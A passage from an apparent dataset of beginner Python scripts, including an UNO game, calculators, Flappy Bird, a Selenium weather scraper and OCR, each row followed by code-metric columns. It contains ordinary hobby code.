            last -= 1
              
        else: 
            flag = 1
            break; 
              
    if flag == 0: 
        print(""The entered string is palindrome"") 
    else: 
        print(""The entered string is not palindrome"") 
                  
def symmetry(a): 
      
    n = len(a) 
    flag = 0
       
    if n%2: 
        mid = n//2 +1
    else: 
        mid = n//2
          
    start1 = 0
    start2 = mid 
      
    while(start1 < mid and start2 < n): 
          
        if (a[start1]== a[start2]): 
            start1 = start1 + 1
            start2 = start2 + 1
        else: 
            flag = 1
            break
      
    if flag == 0: 
        print(""The entered string is symmetrical"") 
    else: 
        print(""The entered string is not symmetrical"") 
          
string = 'amaama'
palindrome(string) 
symmetry(string) 
",1057,39,39,14,0,0,0,2.0,10,19,7,38.0,25,,57,135.74788919877133,285.0,5.32,bajo,No,False,False,Medium,id81
uno.py,"#      uno game      #

import random
""""""
Generate the UNO deck of 108 cards.
Parameters: None
Return values: deck=>list
""""""


def buildDeck():
    deck = []
    # example card:Red 7,Green 8, Blue skip
    colours = [""Red"", ""Green"", ""Yellow"", ""Blue""]
    values = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, ""Draw Two"", ""Skip"", ""Reverse""]
    wilds = [""Wild"", ""Wild Draw Four""]
    for colour in colours:
        for value in values:
            cardVal = ""{} {}"".format(colour, value)
            deck.append(cardVal)
            if value != 0:
                deck.append(cardVal)
    for i in range(4):
        deck.append(wilds[0])
        deck.append(wilds[1])
    print(deck)
    return deck


""""""
Shuffles a list of items passed into it
Parameters: deck=>list
Return values: deck=>list
""""""


def shuffleDeck(deck):
    for cardPos in range(len(deck)):
        randPos = random.randint(0, 107)
        deck[cardPos], deck[randPos] = deck[randPos], deck[cardPos]
    return deck


""""""Draw card function that draws a specified number of cards off the top of the deck
Parameters: numCards -> integer
Return: cardsDrawn -> list
""""""


def drawCards(numCards):
    cardsDrawn = []
    for x in range(numCards):
        cardsDrawn.append(unoDeck.pop(0))
    return cardsDrawn


""""""
Print formatted list of player's hand
Parameter: player->integer , playerHand->list
Return: None
""""""


def showHand(player, playerHand):
    print(""Player {}'s Turn"".format(players_name[player]))
    print(""Your Hand"")
    print(""------------------"")
    y = 1
    for card in playerHand:
        print(""{}) {}"".format(y, card))
        y += 1
    print("""")


""""""
Check whether a player is able to play a card, or not
Parameters: discardCard->string,value->string, playerHand->list
Return: boolean
""""""


def canPlay(colour, value, playerHand):
    for card in playerHand:
        if ""Wild"" in card:
            return True
        elif colour in card or value in card:
            return True
    return False


unoDeck = buildDeck()
unoDeck = shuffleDeck(unoDeck)
unoDeck = shuffleDeck(unoDeck)
discards = []

players_name = []
players = []
colours = [""Red"", ""Green"", ""Yellow"", ""Blue""]
numPlayers = int(input(""How many players?""))
while numPlayers < 2 or numPlayers > 4:
    numPlayers = int(
        input(""Invalid. Please enter a number between 2-4.\nHow many players?""))
for player in range(numPlayers):
    players_name.append(input(""Enter player {} name: "".format(player+1)))
    players.append(drawCards(5))


playerTurn = 0
playDirection = 1
playing = True
discards.append(unoDeck.pop(0))
splitCard = discards[0].split("" "", 1)
currentColour = splitCard[0]
if currentColour != ""Wild"":
    cardVal = splitCard[1]
else:
    cardVal = ""Any""

while playing:
    showHand(playerTurn, players[playerTurn])
    print(""Card on top of discard pile: {}"".format(discards[-1]))
    if canPlay(currentColour, cardVal, players[playerTurn]):
        cardChosen = int(input(""Which card do you want to play?""))
        while not canPlay(currentColour, cardVal, [players[playerTurn][cardChosen-1]]):
            cardChosen = int(
                input(""Not a valid card. Which card do you want to play?""))
        print(""You played {}"".format(players[playerTurn][cardChosen-1]))
        discards.append(players[playerTurn].pop(cardChosen-1))

        # cheak if player won
        if len(players[playerTurn]) == 0:
            playing = False
            # winner = ""Player {}"".format(playerTurn+1)
            winner = players_name[playerTurn]
        else:
            # cheak for special cards
            splitCard = discards[-1].split("" "", 1)
            currentColour = splitCard[0]
            if len(splitCard) == 1:
                cardVal = ""Any""
            else:
                cardVal = splitCard[1]
            if currentColour == ""Wild"":
                for x in range(len(colours)):
                    print(""{}) {}"".format(x+1, colours[x]))
                newColour = int(
                    input(""What colour would you like to choose? ""))
                while newColour < 1 or newColour > 4:
                    newColour = int(
                        input(""Invalid option. What colour would you like to choose""))
                currentColour = colours[newColour-1]
            if cardVal == ""Reverse"":
                playDirection = playDirection * -1
            elif cardVal == ""Skip"":
                playerTurn += playDirection
                if playerTurn >= numPlayers:
                    playerTurn = 0
                elif playerTurn < 0:
                    playerTurn = numPlayers-1
            elif cardVal == ""Draw Two"":
                playerDraw = playerTurn+playDirection
                if playerDraw == numPlayers:
                    playerDraw = 0
                elif playerDraw < 0:
                    playerDraw = numPlayers-1
                players[playerDraw].extend(drawCards(2))
            elif cardVal == ""Draw Four"":
                playerDraw = playerTurn+playDirection
                if playerDraw == numPlayers:
                    playerDraw = 0
                elif playerDraw < 0:
                    playerDraw = numPlayers-1
                players[playerDraw].extend(drawCards(4))
            print("""")
    else:
        print(""You can't play. You have to draw a card."")
        players[playerTurn].extend(drawCards(1))

    playerTurn += playDirection
    if playerTurn >= numPlayers:
        playerTurn = 0
    elif playerTurn < 0:
        playerTurn = numPlayers-1

print(""Game Over"")
print(""{} is the Winner!"".format(winner))
",5559,130,129,28,5,5,24,5.0,16,47,12,90.0,37,,137,235.76932453692504,769.2152486437835,14.594594594594597,bajo,No,True,True,Very High,id82
Rotate_Linked_List.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class Linked_List:
    def __init__(self):
        self.head = None

    def Insert_At_Beginning(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        new_node.next = self.head
        self.head = new_node

    def Rotation(self, key):
        if key == 0:
            return
        current = self.head
        count = 1
        while count < key and current is not None:
            current = current.next
            count += 1
        if current is None:
            return
        Kth_Node = current
        while current.next is not None:
            current = current.next
        current.next = self.head
        self.head = Kth_Node.next
        Kth_Node.next = None

    def Display(self):
        temp = self.head
        while temp:
            print(temp.data, ""->"", end="" "")
            temp = temp.next
        print(""None"")


if __name__ == ""__main__"":
    L_list = Linked_List()
    L_list.Insert_At_Beginning(8)
    L_list.Insert_At_Beginning(5)
    L_list.Insert_At_Beginning(10)
    L_list.Insert_At_Beginning(7)
    L_list.Insert_At_Beginning(6)
    L_list.Insert_At_Beginning(11)
    L_list.Insert_At_Beginning(9)
    print(""Linked List Before Rotation: "")
    L_list.Display()
    print(""Linked List After Rotation: "")
    L_list.Rotation(4)
    L_list.Display()
",1524,50,50,7,0,0,0,5.0,18,9,6,18.0,13,,27,63.61549134016113,114.6940428629768,4.153846153846154,bajo,Yes,False,False,Low,id83
simple_calculator_GUI.py,"from tkinter import *

# To install hupper, use: ""pip install hupper""
# On CMD, or Terminal.
import hupper


# Python program to create a simple GUI
# calculator using Tkinter

# Importing everything from tkinter module

# globally declare the expression variable
# Global variables are those variables that can be accessed and used inside any function.
global expression, equation
expression = """"


def start_reloader():
    """"""Adding a live server for tkinter test GUI, which reloads the GUI when the code is changed.""""""
    reloader = hupper.start_reloader(""p1.main"")


# Function to update expression
# In the text entry box
def press(num):
    """"""Function to update expression in the text entry box.

    Args:
        num (int): The number to be input to the expression.
    """"""
    # point out the global expression variable
    global expression, equation

    # concatenation of string
    expression = expression + str(num)

    # update the expression by using set method
    equation.set(expression)


# Function to evaluate the final expression
def equalpress():
    """"""Function to evaluate the final expression.""""""
    # Try and except statement is used
    # For handling the errors like zero
    # division error etc.

    # Put that code inside the try block
    # which may generate the error

    try:
        global expression, equation
        # eval function evaluate the expression
        # and str function convert the result
        # into string

        #! Is using eval() function, safe?
        #! Isn't it a security risk?!

        total = str(eval(expression))
        equation.set(total)

        # Initialize the expression variable
        # by empty string

        expression = """"

    # if error is generate then handle
    # by the except block

    except:
        equation.set("" Error "")
        expression = """"


# Function to clear the contents
# of text entry box


def clear_func():
    """"""Function to clear the contents of text entry box.""""""
    global expression, equation
    expression = """"
    equation.set("""")


def close_app():
    """"""Function to close the app.""""""
    global gui  # Creating a global variable
    return gui.destroy()


# Driver code
def main():
    """"""Driver code for the GUI calculator.""""""
    # create a GUI window

    global gui  # Creating a global variable
    gui = Tk()
    global equation
    equation = StringVar()

    # set the background colour of GUI window
    gui.configure(background=""grey"")

    # set the title of GUI window
    gui.title(""Simple Calculator"")

    # set the configuration of GUI window
    gui.geometry(""270x160"")

    # StringVar() is the variable class
    # we create an instance of this class

    # create the text entry box for
    # showing the expression .

    expression_field = Entry(gui, textvariable=equation)

    # grid method is used for placing
    # the widgets at respective positions
    # In table like structure.

    expression_field.grid(columnspan=4, ipadx=70)

    # create a Buttons and place at a particular
    # location inside the root windows.
    # when user press the button, the command or
    # function affiliated to that button is executed.

    # Embedding buttons to the GUI window.
    # Button 1 = int(1)
    button1 = Button(
        gui,
        text="" 1 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(1),
        height=1,
        width=7,
    )
    button1.grid(row=2, column=0)

    # Button 2 = int(2)
    button2 = Button(
        gui,
        text="" 2 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(2),
        height=1,
        width=7,
    )
    button2.grid(row=2, column=1)

    # Button 3 = int(3)
    button3 = Button(
        gui,
        text="" 3 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(3),
        height=1,
        width=7,
    )
    button3.grid(row=2, column=2)

    # Button 4 = int(4)
    button4 = Button(
        text="" 4 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(4),
        height=1,
        width=7,
    )
    button4.grid(row=3, column=0)

    # Button 5 = int(5)
    button5 = Button(
        text="" 5 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(5),
        height=1,
        width=7,
    )
    button5.grid(row=3, column=1)

    # Button 6 = int(6)
    button6 = Button(
        text="" 6 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(6),
        height=1,
        width=7,
    )
    button6.grid(row=3, column=2)

    # Button 7 = int(7)
    button7 = Button(
        text="" 7 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(7),
        height=1,
        width=7,
    )
    button7.grid(row=4, column=0)

    # Button 8 = int(8)
    button8 = Button(
        text="" 8 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(8),
        height=1,
        width=7,
    )
    button8.grid(row=4, column=1)

    # Button 9 = int(9)
    button9 = Button(
        text="" 9 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(9),
        height=1,
        width=7,
    )
    button9.grid(row=4, column=2)

    # Button 0 = int(0)
    button0 = Button(
        text="" 0 "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(0),
        height=1,
        width=7,
    )
    button0.grid(row=5, column=0)

    # Embedding the operator buttons.

    # Button + = inputs ""+"" operator.
    plus = Button(
        gui,
        text="" + "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(""+""),
        height=1,
        width=7,
    )
    plus.grid(row=2, column=3)

    # Button - = inputs ""-"" operator.
    minus = Button(
        gui,
        text="" - "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(""-""),
        height=1,
        width=7,
    )
    minus.grid(row=3, column=3)

    # Button * = inputs ""*"" operator.
    multiply = Button(
        gui,
        text="" * "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(""*""),
        height=1,
        width=7,
    )
    multiply.grid(row=4, column=3)

    # Button / = inputs ""/"" operator.
    divide = Button(
        gui,
        text="" / "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press(""/""),
        height=1,
        width=7,
    )
    divide.grid(row=5, column=3)

    # Button = = inputs ""="" operator.
    equal = Button(
        gui,
        text="" = "",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=equalpress,
        height=1,
        width=7,
    )
    equal.grid(row=5, column=2)

    # Button Clear = clears the input field.
    clear = Button(
        gui,
        text=""Clear"",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=clear_func,
        height=1,
        width=7,
    )
    clear.grid(row=5, column=1)  # Why this is an in string, the column?

    # Button . = inputs ""."" decimal in calculations.
    Decimal = Button(
        gui,
        text=""."",
        fg=""#FFFFFF"",
        bg=""#000000"",
        command=lambda: press("".""),
        height=1,
        width=7,
    )
    Decimal.grid(row=6, column=0)

    # gui.after(1000, lambda: gui.focus_force()) # What is this for?
    # gui.after(1000, close_app)

    gui.mainloop()


class Metadata:
    def __init__(self):
        # Author Information
        self.author_name = ""Nitkarsh Chourasia""
        self.author_email = ""playnitkarsh@gmail.com""
        self.gh_profile_url = ""https://github.com/NitkarshChourasia""
        self.gh_username = ""NitkarshChourasia""

        # Project Information
        self.project_name = ""Simple Calculator""
        self.project_description = (
            ""A simple calculator app made using Python and Tkinter.""
        )
        self.project_creation_date = ""30-09-2023""
        self.project_version = ""1.0.0""

        # Edits
        self.original_author = ""Nitkarsh Chourasia""
        self.original_author_email = ""playnitkarsh@gmail.com""
        self.last_edit_date = ""30-09-2023""
        self.last_edit_author = ""Nitkarsh Chourasia""
        self.last_edit_author_email = ""playnitkarsh@gmail.com""
        self.last_edit_author_gh_profile_url = ""https://github.com/NitkarshChourasia""
        self.last_edit_author_gh_username = ""NitkarshChourasia""

    def display_author_info(self):
        """"""Display author information.""""""
        print(f""Author Name: {self.author_name}"")
        print(f""Author Email: {self.author_email}"")
        print(f""GitHub Profile URL: {self.gh_profile_url}"")
        print(f""GitHub Username: {self.gh_username}"")

    def display_project_info(self):
        """"""Display project information.""""""
        print(f""Project Name: {self.project_name}"")
        print(f""Project Description: {self.project_description}"")
        print(f""Project Creation Date: {self.project_creation_date}"")
        print(f""Project Version: {self.project_version}"")

    def display_edit_info(self):
        """"""Display edit information.""""""
        print(f""Original Author: {self.original_author}"")
        print(f""Original Author Email: {self.original_author_email}"")
        print(f""Last Edit Date: {self.last_edit_date}"")
        print(f""Last Edit Author: {self.last_edit_author}"")
        print(f""Last Edit Author Email: {self.last_edit_author_email}"")
        print(
            f""Last Edit Author GitHub Profile URL: {self.last_edit_author_gh_profile_url}""
        )
        print(f""Last Edit Author GitHub Username: {self.last_edit_author_gh_username}"")

    def open_github_profile(self) -> None:
        """"""Open the author's GitHub profile in a new tab.""""""
        import webbrowser

        return webbrowser.open_new_tab(self.gh_profile_url)


if __name__ == ""__main__"":
    # start_reloader()
    main()

    # # Example usage:
    # metadata = Metadata()

    # # Display author information
    # metadata.display_author_info()

    # # Display project information
    # metadata.display_project_info()

    # # Display edit information
    # metadata.display_edit_info()

# TODO: More features to add:
# Responsive design is not there.
# The program is not OOP based, there is lots and lots of repetitions.
# Bigger fonts.
# Adjustable everything.
# Default size, launch, but customizable.
# Adding history.
# Being able to continuosly operate on a number.
# What is the error here, see to it.
# To add Author Metadata.

# TODO: More features will be added, soon.


# Working.
# Perfect.
# Complete.
# Do not remove the comments, they make the program understandable.
# Thank you. :) â¤ï¸
# Made with â¤ï¸
",10691,136,244,79,98,104,4,11.0,14,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,Yes,False,False,Low,id84
Calculator with simple ui.py,"# Program make a simple calculator


class Calculator:
    def __init__(self):
        pass

    def add(self, num1, num2):
        """"""
        This function adds two numbers.

        Examples:
        >>> add(2, 3)
        5
        >>> add(5, 9)
        14
        >>> add(-1, 2)
        1
        """"""
        return num1 + num2

    def subtract(self, num1, num2):
        """"""
        This function subtracts two numbers.

        Examples:
        >>> subtract(5, 3)
        2
        >>> subtract(9, 5)
        4
        >>> subtract(4, 9)
        -5
        """"""
        return num1 - num2

    def multiply(self, num1, num2):
        """"""
        This function multiplies two numbers.

        Examples:
        >>> multiply(4, 2)
        8
        >>> multiply(3, 3)
        9
        >>> multiply(9, 9)
        81
        """"""
        return num1 * num2

    def divide(self, num1, num2):
        """"""
        This function divides two numbers.

        Examples:
        >>> divide(4, 4)
        1
        >>> divide(6, 3)
        2
        >>> divide(9, 1)
        9
        """"""
        if num2 == 0:
            print(""Cannot divide by zero"")
        else:
            return num1 / num2


calculator = Calculator()


print(""1.Add"")
print(""2.Subtract"")
print(""3.Multiply"")
print(""4.Divide"")

while True:
    # Take input from the user
    choice = input(""Enter choice(1/2/3/4): "")

    # Check if choice is one of the four options
    if choice in (""1"", ""2"", ""3"", ""4""):
        num1 = float(input(""Enter first number: ""))
        num2 = float(input(""Enter second number: ""))

        if choice == ""1"":
            print(calculator.add(num1, num2))

        elif choice == ""2"":
            print(calculator.subtract(num1, num2))

        elif choice == ""3"":
            print(calculator.multiply(num1, num2))

        elif choice == ""4"":
            print(calculator.divide(num1, num2))
        break
    else:
        print(""Invalid Input"")
",1950,39,35,20,3,3,40,,8,10,6,20.0,15,,30,74.11313393845472,131.76952268336282,4.0,medio,Yes,True,False,Low-Medium,id85
number guessing.py,"import random
attempts_list = []
def show_score():
    if len(attempts_list) <= 0:
        print(""There is currently no high score, it's yours for the taking!"")
    else:
        print(""The current high score is {} attempts"".format(min(attempts_list)))
def start_game():
    random_number = int(random.randint(1, 10))
    print(""Hello traveler! Welcome to the game of guesses!"")
    player_name = input(""What is your name? "")
    wanna_play = input(""Hi, {}, would you like to play the guessing game? (Enter Yes/No) "".format(player_name))
    # Where the show_score function USED to be
    attempts = 0
    show_score()
    while wanna_play.lower() == ""yes"":
        try:
            guess = input(""Pick a number between 1 and 10 "")
            if int(guess) < 1 or int(guess) > 10:
                raise ValueError(""Please guess a number within the given range"")
            if int(guess) == random_number:
                print(""Nice! You got it!"")
                attempts += 1
                attempts_list.append(attempts)
                print(""It took you {} attempts"".format(attempts))
                play_again = input(""Would you like to play again? (Enter Yes/No) "")
                attempts = 0
                show_score()
                random_number = int(random.randint(1, 10))
                if play_again.lower() == ""no"":
                    print(""That's cool, have a good one!"")
                    break
            elif int(guess) > random_number:
                print(""It's lower"")
                attempts += 1
            elif int(guess) < random_number:
                print(""It's higher"")
                attempts += 1
        except ValueError as err:
            print(""Oh no!, that is not a valid value. Try again..."")
            print(""({})"".format(err))
    else:
        print(""That's cool, have a good one!"")
if __name__ == '__main__':
    start_game()
",1891,44,44,0,1,1,0,2.0,12,13,6,26.0,19,,39,96.22039775975506,181.11039140121423,4.105263157894737,medio,No,True,True,Low-Medium,id86
Extract_Text_from_image.py,"# extract text from a img and its coordinates using the pytesseract module
import cv2
import pytesseract

# You need to add tesseract binary dependency to system variable for this to work

img = cv2.imread(""img.png"")
# We need to convert the img into RGB format
img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)

hI, wI, k = img.shape
print(pytesseract.image_to_string(img))
boxes = pytesseract.image_to_boxes(img)
for b in boxes.splitlines():
    b = b.split("" "")
    x, y, w, h = int(b[1]), int(b[2]), int(b[3]), int(b[4])
    cv2.rectangle(img, (x, hI - y), (w, hI - h), (0, 0, 255), 0.2)

cv2.imshow(""img"", img)
cv2.waitKey(0)
",624,13,13,4,3,3,0,0.0,0,2,1,,3,,6,4.754887502163469,12.0,0.6666666666666666,alto,No,False,False,Low,id87
weather.py,"#TODO - refactor & clean code
import csv
import time
from datetime import datetime
from datetime import date
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

#TODO - Add input checking
city = input(""City >"")
state = input(""State >"")

url = 'https://www.wunderground.com'

#Supresses warnings and specifies the webdriver to run w/o a GUI
options = Options()
options.headless = True
options.add_argument('log-level=3')
driver = webdriver.Chrome(options=options)

driver.get(url)
#-----------------------------------------------------
# Connected successfully to the site
#Passes the city and state input to the weather sites search box

searchBox = driver.find_element(By.XPATH, '//*[@id=""wuSearch""]')
location = city + "" "" + state

action = ActionChains(driver)
searchBox.send_keys(location)
element = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((By.XPATH, '//*[@id=""wuForm""]/search-autocomplete/ul/li[2]/a/span[1]'))
)
searchBox.send_keys(Keys.RETURN)
#-----------------------------------------------------
#Gather weather data
#City - Time - Date - Temperature - Precipitation - Sky - Wind

#waits till the page loads to begin gathering data
precipitationElem = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((By.XPATH, '//*[@id=""inner-content""]/div[3]/div[1]/div/div[3]/div/lib-city-today-forecast/div/div[1]/div/div/div/a[1]'))
)
precipitationElem = driver.find_element(By.XPATH, '//*[@id=""inner-content""]/div[3]/div[1]/div/div[3]/div/lib-city-today-forecast/div/div[1]/div/div/div/a[1]')
precip = ""Precipitation:"" + precipitationElem.text.split()[0]

windAndSkyElem = driver.find_element(By.XPATH, '//*[@id=""inner-content""]/div[3]/div[1]/div/div[3]/div/lib-city-today-forecast/div/div[1]/div/div/div/a[2]')
description = windAndSkyElem.text.split("". "")
sky = description[0]
temp = description[1]
wind = description[2]

#Format the date and time
time = datetime.now().strftime(""%H:%M"")
today = date.today()
date = today.strftime(""%b-%d-%Y"")

print(city, time, date, temp, precip, sky, wind)

with open(""weather.csv"", ""a"") as new_file:
    csv_writer = csv.writer(new_file)
    csv_writer.writerow([city, time, date, temp, precip, sky, wind])

driver.close()
",2521,41,45,12,11,11,0,0.0,0,3,1,6.0,6,,9,15.509775004326936,25.26619429851844,0.5,medio,No,True,False,Low,id88
flappy_bird.py,"#! /usr/bin/env python3
# -*- coding: utf-8 -*-
""""""
Created on Fri Mar 23 14:17:24 2019

@author: Mehul
""""""


import math
import os
from collections import deque
from random import randint

import pygame
from pygame.locals import *

FPS = 60
ANI_SPEED = 0.18  # pixels per millisecond
W_WIDTH = 284 * 2  # BG image size: 284x512 px; tiled twice
W_HEIGHT = 512


class Bird(pygame.sprite.Sprite):

    WIDTH = 32  #   bird image width
    HEIGHT = 32  #   bird image height
    DOWN_SPEED = 0.18  #   pix per ms  -y
    UP_SPEED = 0.3  #   pix per ms  +y
    UP_DURATION = 150  #   time for which bird go up

    def __init__(self, x, y, ms_to_up, images):

        super(Bird, self).__init__()
        self.x, self.y = x, y
        self.ms_to_up = ms_to_up
        self._img_wingup, self._img_wingdown = images
        self._mask_wingup = pygame.mask.from_surface(self._img_wingup)
        self._mask_wingdown = pygame.mask.from_surface(self._img_wingdown)

    def update(self, delta_frames=1):

        if self.ms_to_up > 0:
            frac_climb_done = 1 - self.ms_to_up / Bird.UP_DURATION
            self.y -= (
                Bird.UP_SPEED
                * frames_to_msec(delta_frames)
                * (1 - math.cos(frac_climb_done * math.pi))
            )
            self.ms_to_up -= frames_to_msec(delta_frames)
        else:
            self.y += Bird.DOWN_SPEED * frames_to_msec(delta_frames)

    @property
    def image(self):
        # to animate bird
        if pygame.time.get_ticks() % 500 >= 250:
            return self._img_wingup
        else:
            return self._img_wingdown

    @property
    def mask(self):
        # collision detection
        if pygame.time.get_ticks() % 500 >= 250:
            return self._mask_wingup
        else:
            return self._mask_wingdown

    @property
    def rect(self):
        # return birds params
        return Rect(self.x, self.y, Bird.WIDTH, Bird.HEIGHT)


class PipePair(pygame.sprite.Sprite):

    WIDTH = 80  #    width of pipe
    PIECE_HEIGHT = 32
    ADD_INTERVAL = 3000

    def __init__(self, pipe_end_img, pipe_body_img):

        self.x = float(W_WIDTH - 1)
        self.score_counted = False

        self.image = pygame.Surface((PipePair.WIDTH, W_HEIGHT), SRCALPHA)
        self.image.convert()  # speeds up blitting
        self.image.fill((0, 0, 0, 0))
        total_pipe_body_pieces = int(
            (
                W_HEIGHT
                - 3 * Bird.HEIGHT  # fill window from top to bottom
                - 3 * PipePair.PIECE_HEIGHT  # make room for bird to fit through
            )
            / PipePair.PIECE_HEIGHT  # 2 end pieces + 1 body piece  # to get number of pipe pieces
        )
        self.bottom_pieces = randint(1, total_pipe_body_pieces)
        self.top_pieces = total_pipe_body_pieces - self.bottom_pieces

        # bottom pipe
        for i in range(1, self.bottom_pieces + 1):
            piece_pos = (0, W_HEIGHT - i * PipePair.PIECE_HEIGHT)
            self.image.blit(pipe_body_img, piece_pos)
        bottom_pipe_end_y = W_HEIGHT - self.bottom_height_px
        bottom_end_piece_pos = (0, bottom_pipe_end_y - PipePair.PIECE_HEIGHT)
        self.image.blit(pipe_end_img, bottom_end_piece_pos)

        # top pipe
        for i in range(self.top_pieces):
            self.image.blit(pipe_body_img, (0, i * PipePair.PIECE_HEIGHT))
        top_pipe_end_y = self.top_height_px
        self.image.blit(pipe_end_img, (0, top_pipe_end_y))

        # compensate for added end pieces
        self.top_pieces += 1
        self.bottom_pieces += 1

        # for collision detection
        self.mask = pygame.mask.from_surface(self.image)

    @property
    def top_height_px(self):
        # returns top pipe's height in pix
        return self.top_pieces * PipePair.PIECE_HEIGHT

    @property
    def bottom_height_px(self):

        return self.bottom_pieces * PipePair.PIECE_HEIGHT

    @property
    def visible(self):
        # pipe is on screen or not
        return -PipePair.WIDTH < self.x < W_WIDTH

    @property
    def rect(self):
        # Get the Rect which contains this Pipe.
        return Rect(self.x, 0, PipePair.WIDTH, PipePair.PIECE_HEIGHT)

    def update(self, delta_frames=1):

        self.x -= ANI_SPEED * frames_to_msec(delta_frames)

    def collides_with(self, bird):

        return pygame.sprite.collide_mask(self, bird)


def load_images():
    def load_image(img_file_name):

        file_name = os.path.join(""."", ""images"", img_file_name)
        img = pygame.image.load(file_name)
        img.convert()
        return img

    return {
        ""background"": load_image(""background.png""),
        ""pipe-end"": load_image(""pipe_end.png""),
        ""pipe-body"": load_image(""pipe_body.png""),
        # images for animating the flapping bird -- animated GIFs are
        # not supported in pygame
        ""bird-wingup"": load_image(""bird_wing_up.png""),
        ""bird-wingdown"": load_image(""bird_wing_down.png""),
    }


def frames_to_msec(frames, fps=FPS):

    return 1000.0 * frames / fps


def msec_to_frames(milliseconds, fps=FPS):

    return fps * milliseconds / 1000.0


""""""
def gameover(display, score):
    font = pygame.font.SysFont(None,55)
    text = font.render(""Game Over! Score: {}"".format(score),True,(255,0,0))
    display.blit(text, [150,250])""""""


def main():

    pygame.init()

    display_surface = pygame.display.set_mode((W_WIDTH, W_HEIGHT))
    pygame.display.set_caption(""Flappy Bird by PMN"")

    clock = pygame.time.Clock()
    score_font = pygame.font.SysFont(None, 32, bold=True)  # default font
    images = load_images()

    # the bird stays in the same x position, so bird.x is a constant
    # center bird on screen
    bird = Bird(
        50,
        int(W_HEIGHT / 2 - Bird.HEIGHT / 2),
        2,
        (images[""bird-wingup""], images[""bird-wingdown""]),
    )

    pipes = deque()

    frame_clock = 0  # this counter is only incremented if the game isn't paused
    score = 0
    done = paused = False
    while not done:
        clock.tick(FPS)

        # Handle this 'manually'.  If we used pygame.time.set_timer(),
        # pipe addition would be messed up when paused.
        if not (paused or frame_clock % msec_to_frames(PipePair.ADD_INTERVAL)):
            pp = PipePair(images[""pipe-end""], images[""pipe-body""])
            pipes.append(pp)

        for e in pygame.event.get():
            if e.type == QUIT or (e.type == KEYUP and e.key == K_ESCAPE):
                done = True
                break
            elif e.type == KEYUP and e.key in (K_PAUSE, K_p):
                paused = not paused
            elif e.type == MOUSEBUTTONUP or (
                e.type == KEYUP and e.key in (K_UP, K_RETURN, K_SPACE)
            ):
                bird.ms_to_up = Bird.UP_DURATION

        if paused:
            continue  # don't draw anything

        # check for collisions
        pipe_collision = any(p.collides_with(bird) for p in pipes)
        if pipe_collision or 0 >= bird.y or bird.y >= W_HEIGHT - Bird.HEIGHT:
            done = True

        for x in (0, W_WIDTH / 2):
            display_surface.blit(images[""background""], (x, 0))

        while pipes and not pipes[0].visible:
            pipes.popleft()

        for p in pipes:
            p.update()
            display_surface.blit(p.image, p.rect)

        bird.update()
        display_surface.blit(bird.image, bird.rect)

        # update and display score
        for p in pipes:
            if p.x + PipePair.WIDTH < bird.x and not p.score_counted:
                score += 1
                p.score_counted = True

        score_surface = score_font.render(str(score), True, (255, 255, 255))
        score_x = W_WIDTH / 2 - score_surface.get_width() / 2
        display_surface.blit(score_surface, (score_x, PipePair.PIECE_HEIGHT))

        pygame.display.flip()
        frame_clock += 1
    # gameover(display_surface, score)

    print(""Game over! Score: %i"" % score)

    pygame.quit()


if __name__ == ""__main__"":
    # If this module had been imported, __name__ would be 'flappybird'.
    # It was executed (e.g. by double-clicking the file), so call main.
    main()
",8425,153,176,69,38,21,9,17.0,49,81,14,156.0,118,132.0,237,865.4548487335037,1669.5214062879534,9.254237288135592,bajo,Yes,False,False,Very High,id89
floodfill.py,"import pygame

""""""
Visualises how a floodfill algorithm runs and work using pygame
Pass two int arguments for the window width and the window height
`python floodfill.py <width> <height>`
""""""


class FloodFill:
    def __init__(self, window_width, window_height):
        self.window_width = int(window_width)
        self.window_height = int(window_height)

        pygame.init()
        pygame.display.set_caption(""Floodfill"")
        self.display = pygame.display.set_mode((self.window_width, self.window_height))
        self.surface = pygame.Surface(self.display.get_size())
        self.surface.fill((0, 0, 0))

        self.generateClosedPolygons()  # for visualisation purposes

        self.queue = []

    def generateClosedPolygons(self):
        if self.window_height < 128 or self.window_width < 128:
            return  # surface too small

        from random import randint, uniform
        from math import pi, sin, cos

        for n in range(0, randint(0, 5)):
            x = randint(50, self.window_width - 50)
            y = randint(50, self.window_height - 50)

            angle = 0
            angle += uniform(0, 0.7)
            vertices = []

            for i in range(0, randint(3, 7)):
                dist = randint(10, 50)
                vertices.append(
                    (int(x + cos(angle) * dist), int(y + sin(angle) * dist))
                )
                angle += uniform(0, pi / 2)

            for i in range(0, len(vertices) - 1):
                pygame.draw.line(
                    self.surface, (255, 0, 0), vertices[i], vertices[i + 1]
                )

            pygame.draw.line(
                self.surface, (255, 0, 0), vertices[len(vertices) - 1], vertices[0]
            )

    def run(self):
        looping = True
        while looping:
            evsforturn = []
            for ev in pygame.event.get():
                if ev.type == pygame.QUIT:
                    looping = False
                else:
                    evsforturn.append(ev)  # TODO: Maybe extend with more events
            self.update(evsforturn)
